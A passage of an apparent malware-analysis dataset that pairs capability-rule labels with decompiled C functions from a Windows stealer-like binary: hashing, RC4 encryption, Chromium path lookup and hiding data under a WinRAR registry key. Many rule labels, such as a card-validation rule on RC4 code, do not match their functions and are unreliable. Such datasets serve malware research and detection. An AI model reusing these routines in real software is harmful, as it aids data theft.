(uVar4 * 0x80 | uVar4 >> 0x19) + uVar5;\n        uVar3 = ((uVar5 ^ uVar2) & uVar4 ^ uVar2) + 0x4787c62a + uVar3 + arg_ch[5];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n        uVar2 = ((uVar4 ^ uVar5) & uVar3 ^ uVar5) + 0xa8304613 + uVar2 + arg_ch[6];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar1 = ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0xfd469501 + uVar5 + arg_ch[7];\n        uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar1 ^ uVar3) + 0x698098d8 + uVar4 + arg_ch[8];\n        uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n        uVar3 = ((uVar1 ^ uVar2) & uVar4 ^ uVar2) + 0x8b44f7af + uVar3 + arg_ch[9];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n        uVar2 = (((uVar4 ^ uVar1) & uVar3 ^ uVar1) - 0xa44f) + uVar2 + arg_ch[10];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar1 = ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0x895cd7be + uVar1 + arg_ch[0xb];\n        uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar1 ^ uVar3) + 0x6b901122 + uVar4 + arg_ch[0xc];\n        uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n        uVar3 = ((uVar1 ^ uVar2) & uVar4 ^ uVar2) + 0xfd987193 + uVar3 + arg_ch[0xd];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n        uVar2 = ((uVar4 ^ uVar1) & uVar3 ^ uVar1) + 0xa679438e + uVar2 + arg_ch[0xe];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar1 = ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0x49b40821 + uVar1 + arg_ch[0xf];\n        uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0xf61e2562 + uVar4 + arg_ch[1];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0xc040b340 + uVar3 + arg_ch[6];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0x265e5a51 + uVar2 + arg_ch[0xb];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0xe9b6c7aa + uVar1 + *arg_ch;\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0xd62f105d + uVar4 + arg_ch[5];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0x2441453 + uVar3 + arg_ch[10];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0xd8a1e681 + uVar2 + arg_ch[0xf];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0xe7d3fbc8 + uVar1 + arg_ch[4];\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0x21e1cde6 + uVar4 + arg_ch[9];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0xc33707d6 + uVar3 + arg_ch[0xe];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0xf4d50d87 + uVar2 + arg_ch[3];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0x455a14ed + uVar1 + arg_ch[8];\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar1) & uVar3 ^ uVar2) + 0xa9e3e905 + uVar4 + arg_ch[0xd];\n        uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n        uVar3 = ((uVar1 ^ uVar4) & uVar2 ^ uVar1) + 0xfcefa3f8 + uVar3 + arg_ch[2];\n        uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n        uVar2 = ((uVar4 ^ uVar3) & uVar1 ^ uVar4) + 0x676f02d9 + uVar2 + arg_ch[7];\n        uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n        uVar1 = ((uVar3 ^ uVar2) & uVar4 ^ uVar3) + 0x8d2a4c8a + uVar1 + arg_ch[0xc];\n        uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3 ^ uVar1) - 0x5c6be) + uVar4 + arg_ch[5];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0x8771f681 + uVar3 + arg_ch[8];\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0x6d9d6122 + uVar2 + arg_ch[0xb];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0xfde5380c + uVar1 + arg_ch[0xe];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar1) + 0xa4beea44 + uVar4 + arg_ch[1];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0x4bdecfa9 + uVar3 + arg_ch[4];\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0xf6bb4b60 + uVar2 + arg_ch[7];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0xbebfbc70 + uVar1 + arg_ch[10];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar1) + 0x289b7ec6 + uVar4 + arg_ch[0xd];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0xeaa127fa + uVar3 + *arg_ch;\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0xd4ef3085 + uVar2 + arg_ch[3];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0x4881d05 + uVar1 + arg_ch[6];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = (uVar2 ^ uVar3 ^ uVar1) + 0xd9d4d039 + uVar4 + arg_ch[9];\n        uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n        uVar3 = (uVar1 ^ uVar2 ^ uVar4) + 0xe6db99e5 + uVar3 + arg_ch[0xc];\n        uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n        uVar2 = (uVar4 ^ uVar1 ^ uVar3) + 0x1fa27cf8 + uVar2 + arg_ch[0xf];\n        uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n        uVar1 = (uVar3 ^ uVar4 ^ uVar2) + 0xc4ac5665 + uVar1 + arg_ch[2];\n        uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0xf4292244 + uVar4 + *arg_ch;\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0x432aff97 + uVar3 + arg_ch[7];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = ((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) + 0xab9423a7 + uVar2 + arg_ch[0xe];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0xfc93a039 + uVar1 + arg_ch[5];\n        uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0x655b59c3 + uVar4 + arg_ch[0xc];\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0x8f0ccc92 + uVar3 + arg_ch[3];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = (((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) - 0x100b83) + uVar2 + arg_ch[10];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0x85845dd1 + uVar1 + arg_ch[1];\n        uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0x6fa87e4f + uVar4 + arg_ch[8];\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0xfe2ce6e0 + uVar3 + arg_ch[0xf];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = ((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) + 0xa3014314 + uVar2 + arg_ch[6];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0x4e0811a1 + uVar1 + arg_ch[0xd];\n        uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        uVar4 = ((uVar3 ^ 0xffffffff | uVar1) ^ uVar2) + 0xf7537e82 + uVar4 + arg_ch[4];\n        uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n        uVar3 = ((uVar2 ^ 0xffffffff | uVar4) ^ uVar1) + 0xbd3af235 + uVar3 + arg_ch[0xb];\n        uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n        uVar2 = ((uVar1 ^ 0xffffffff | uVar3) ^ uVar4) + 0x2ad7d2bb + uVar2 + arg_ch[2];\n        uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n        uVar1 = ((uVar4 ^ 0xffffffff | uVar2) ^ uVar3) + 0xeb86d391 + uVar1 + arg_ch[9];\n        *arg_8h = *arg_8h + uVar4;\n        arg_8h[1] = arg_8h[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n        arg_8h[2] = arg_8h[2] + uVar2;\n        arg_8h[3] = arg_8h[3] + uVar3;\n        var_4h = var_4h + -1;\n        arg_ch = arg_ch + 0x10;\n    } while (-1 < var_4h);\n    return CONCAT44(in_EDX, in_EAX);\n}\n",
        "token_count": 4726
    },
    "00410f2a": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.00410f2a(uint8_t *param_1, uint32_t *param_2)\n\n{\n    uint32_t *puVar1;\n    \n    *param_2 = *param_1 << 0x18;\n    *param_2 = *param_2 | param_1[1] << 0x10;\n    *param_2 = *param_2 | param_1[2] << 8;\n    puVar1 = param_2 + 1;\n    *param_2 = *param_2 | param_1[3];\n    *puVar1 = param_1[4] << 0x18;\n    *puVar1 = *puVar1 | param_1[5] << 0x10;\n    *puVar1 = param_1[6] << 8 | *puVar1 | param_1[7];\n    return;\n}\n",
        "token_count": 198
    },
    "0040c17f": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c17f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x33, 0);\n    fcn.0040bd47(arg_8h, \"\\\\Chromium\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 92
    },
    "00410f8d": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00410f8d(uint *param_1, uchar *param_2)\n\n{\n    uint *puVar1;\n    \n    *param_2 = *param_1 >> 0x18;\n    param_2[1] = *param_1 >> 0x10;\n    param_2[2] = *param_1 >> 8;\n    puVar1 = param_1 + 1;\n    param_2[3] = *param_1;\n    param_2[4] = *puVar1 >> 0x18;\n    param_2[5] = *puVar1 >> 0x10;\n    param_2[6] = *puVar1 >> 8;\n    param_2[7] = *puVar1;\n    return;\n}\n",
        "token_count": 175
    },
    "00401051": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401069)\n\nvoid fcn.00401051(void)\n\n{\n    return;\n}\n",
        "token_count": 40
    },
    "00401091": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004010a9)\n\nulong __fastcall fcn.00401091(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, param_2);\n}\n",
        "token_count": 57
    },
    "004010d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004010ee)\n// WARNING: Removing unreachable block (ram,0x0040113d)\n// WARNING: Removing unreachable block (ram,0x00401143)\n\nulong __fastcall fcn.004010d6(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, param_2);\n}\n",
        "token_count": 88
    },
    "0040114c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401164)\n\nvoid fcn.0040114c(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "00401230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040124b)\n\nvoid fcn.00401230(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "0040130e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401326)\n\nvoid fcn.0040130e(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "0040149f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040149f(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = arg_ch;\n    uVar1 = fcn.00401091(arg_ch);\n    fcn.004012e8(arg_ch, piVar2, uVar1, 0);\n    (**(*arg_ch + 0x1c))(arg_ch, arg_8h, uVar1, 0, 0, 0);\n    return;\n}\n",
        "token_count": 168
    },
    "004014db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004014db(int32_t *arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    (**(*arg_8h + 0x14))(arg_8h, 0, 0, 1, &var_8h);\n    return var_8h;\n}\n",
        "token_count": 94
    },
    "004015ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004015ef(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00401091(arg_8h);\n    fcn.00401051(arg_8h, arg_ch + 8, 0);\n    fcn.00401522(arg_8h, iVar1 - arg_ch);\n    fcn.004012c2(arg_8h);\n    return iVar1 - arg_ch;\n}\n",
        "token_count": 116
    },
    "0040162e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040162e(uint pstm)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint phglobal;\n    \n    var_ch = 0;\n    iVar1 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n    if (-1 < iVar1) {\n        arg_10h = fcn.00401091(pstm);\n        iVar1 = sub.kernel32.dll_GlobalLock(phglobal);\n        if (iVar1 != 0) {\n            var_ch = fcn.00401bd7(0, iVar1, arg_10h);\n            sub.kernel32.dll_GlobalUnlock(phglobal);\n        }\n    }\n    fcn.004012c2(pstm);\n    fcn.00401522(pstm, ~(var_ch >> 0x18 | (var_ch & 0xff0000) >> 8 | (var_ch & 0xff00) << 8 | var_ch << 0x18));\n    return;\n}\n",
        "token_count": 230
    },
    "00401741": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401741(uint pstm, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint var_8h;\n    uint phglobal;\n    \n    iVar1 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n    if (-1 < iVar1) {\n        arg_ch_00 = fcn.00401091(pstm);\n        iVar1 = sub.kernel32.dll_GlobalLock(phglobal);\n        if (iVar1 != 0) {\n            fcn.004022aa(iVar1, arg_ch_00, arg_ch);\n            sub.kernel32.dll_GlobalUnlock(phglobal);\n        }\n    }\n    fcn.004012c2(pstm);\n    return;\n}\n",
        "token_count": 162
    },
    "004017a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017a5(int32_t uBytes)\n\n{\n    sub.kernel32.dll_LocalAlloc(0x40, uBytes + 0x80);\n    return;\n}\n",
        "token_count": 42
    },
    "00401815": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401815(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint var_2h;\n    \n    fcn.004017bc(arg_8h, 0x102);\n    uVar4 = 0;\n    iVar2 = 0x100;\n    do {\n        *(uVar4 + arg_8h + 2) = uVar4;\n        uVar4 = uVar4 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    arg_8h = arg_8h + 2;\n    var_2h._0_1_ = 0;\n    uVar3 = 0;\n    uVar4 = 0;\n    do {\n        cVar1 = *(uVar4 + arg_8h);\n        var_2h._0_1_ = var_2h + cVar1 + *(uVar3 + arg_ch);\n        *(uVar4 + arg_8h) = *(var_2h + arg_8h);\n        *(var_2h + arg_8h) = cVar1;\n        uVar3 = uVar3 + 1;\n        if (arg_10h <= uVar3) {\n            uVar3 = 0;\n        }\n        uVar5 = uVar4 + 1;\n        uVar4 = uVar5;\n    } while (uVar5 != 0);\n    return;\n}\n",
        "token_count": 393
    },
    "00401880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401880(uint8_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t var_8h;\n    uint8_t var_4h;\n    uint var_3h;\n    \n    var_3h._0_1_ = *arg_8h;\n    var_4h = arg_8h[1];\n    var_8h = 0;\n    if (arg_10h != 0) {\n        do {\n            var_3h._0_1_ = var_3h + 1;\n            uVar2 = arg_8h[var_3h + 2];\n            var_4h = var_4h + uVar2;\n            uVar1 = arg_8h[var_4h + 2];\n            arg_8h[var_3h + 2] = uVar1;\n            arg_8h[var_4h + 2] = uVar2;\n            *(var_8h + arg_ch) = *(var_8h + arg_ch) ^ arg_8h[(uVar2 + uVar1) + 2];\n            var_8h = var_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    *arg_8h = var_3h;\n    arg_8h[1] = var_4h;\n    return;\n}\n",
        "token_count": 370
    },
    "004018fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004018fd(uint pstm)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_118h;\n    uint var_114h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phglobal;\n    \n    uVar1 = sub.kernel32.dll_GetTickCount();\n    var_118h = ~(uVar1 << 0xb | uVar1 >> 0x15);\n    uVar1 = 0;\n    iVar2 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n    if (-1 < iVar2) {\n        var_ch = fcn.00401091(pstm);\n        iVar2 = sub.kernel32.dll_GlobalLock(phglobal);\n        if (iVar2 != 0) {\n            var_10h = iVar2;\n            var_8h = fcn.004017a5(var_ch);\n            fcn.004017dc(var_10h, var_8h, var_ch);\n            sub.kernel32.dll_GlobalUnlock(phglobal);\n            fcn.00401815(&var_114h, &var_118h, 4);\n            fcn.00401880(&var_114h, var_8h, var_ch);\n            fcn.00401356(pstm);\n            uVar1 = fcn.00401537(pstm, &var_118h, 4);\n            uVar3 = fcn.00401537(pstm, var_8h, var_ch);\n            uVar1 = uVar1 & uVar3;\n            fcn.0040178e(var_8h);\n        }\n    }\n    fcn.004012c2(pstm);\n    return uVar1;\n}\n",
        "token_count": 394
    },
    "00401dcb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401dcb(uint lpSrc)\n\n{\n    int32_t uBytes;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpDst;\n    \n    uBytes = sub.kernel32.dll_ExpandEnvironmentStringsA(lpSrc, 0, 0);\n    if (uBytes != 0) {\n        iVar1 = uBytes;\n        iVar2 = uBytes;\n        uBytes = fcn.004017a5(uBytes);\n        iVar1 = sub.kernel32.dll_ExpandEnvironmentStringsA(lpSrc, uBytes, iVar1, iVar2);\n        if (iVar1 == 0) {\n            fcn.0040178e(uBytes);\n            uBytes = 0;\n        }\n    }\n    return uBytes;\n}\n",
        "token_count": 168
    },
    "004022aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022aa(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.004017a5(arg_ch + 0x1000);\n    fcn.004017dc(arg_8h, arg_ch_00, arg_ch);\n    fcn.00402cd6(arg_ch_00, arg_ch, arg_10h);\n    fcn.0040178e(arg_ch_00);\n    return;\n}\n",
        "token_count": 124
    },
    "0040244c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040244c(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *unaff_ESI;\n    \n    iVar2 = 4;\n    uVar3 = 0;\n    do {\n        uVar1 = *unaff_ESI;\n        uVar4 = uVar3;\n        if (uVar1 == 0x2b) {\n            uVar4 = uVar3 + 0x3e;\n        }\n        if (uVar1 == 0x2f) {\n            uVar4 = uVar4 + 0x3f;\n        }\n        if (('/' < uVar1) && (uVar1 < ':')) {\n            uVar1 = uVar1 + 4;\n            uVar4 = uVar4 + uVar1;\n        }\n        if (('@' < uVar1) && (uVar1 < '[')) {\n            uVar1 = uVar1 + 0xbf;\n            uVar4 = uVar4 + uVar1;\n        }\n        if (('`' < uVar1) && (uVar1 < '{')) {\n            uVar4 = uVar4 + (uVar1 + 0xb9);\n        }\n        uVar3 = uVar4 << 6 | uVar4 >> 0x1a;\n        iVar2 = iVar2 + -1;\n        unaff_ESI = unaff_ESI + 1;\n    } while (iVar2 != 0);\n    return ((uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 | uVar4 << 0x18) >> 8;\n}\n",
        "token_count": 390
    },
    "004024ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "create directory",
            "get common file path",
            "set registry value",
            "delete file"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004024ff(uint lpValueName, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint lpFileName;\n    uint lpPathName;\n    int32_t hObject;\n    uint hKey;\n    \n    uVar4 = 0;\n    iVar1 = sub.advapi32.dll_RegCreateKeyA(*0x4120d5, \"Software\\\\WinRAR\", &hKey);\n    if (iVar1 == 0) {\n        iVar1 = sub.advapi32.dll_RegSetValueExA(hKey, lpValueName, 0, 3, arg_ch, arg_10h);\n        uVar4 = iVar1 == 0;\n        sub.advapi32.dll_RegCloseKey(hKey);\n    }\n    if (((uVar4 == 0) && (uVar2 = sub.kernel32.dll_GetTempPathA(0x104, &lpPathName),  uVar2 != 0)) && (uVar2 < 0x105)) {\n        sub.kernel32.dll_CreateDirectoryA(&lpPathName, 0);\n        iVar1 = fcn.004023cb(&lpPathName);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00401c09(&lpPathName, 0x4120b1);\n            uVar3 = fcn.00401c5d(uVar3, lpValueName);\n        }\n        else {\n            uVar3 = fcn.00401c09(&lpPathName, lpValueName);\n        }\n        hObject = sub.kernel32.dll_CreateFileA(uVar3, 0xc0000000, 3, 0, 2, 0, 0);\n        if (hObject != -1) {\n            uVar4 = fcn.0040145e(hObject, arg_ch, arg_10h);\n            sub.kernel32.dll_CloseHandle(hObject);\n        }\n        if (uVar4 == 0) {\n            sub.kernel32.dll_DeleteFileA(uVar3);\n        }\n        fcn.0040178e(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 482
    },
    "00403374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "hash data using SHA1"
        ],
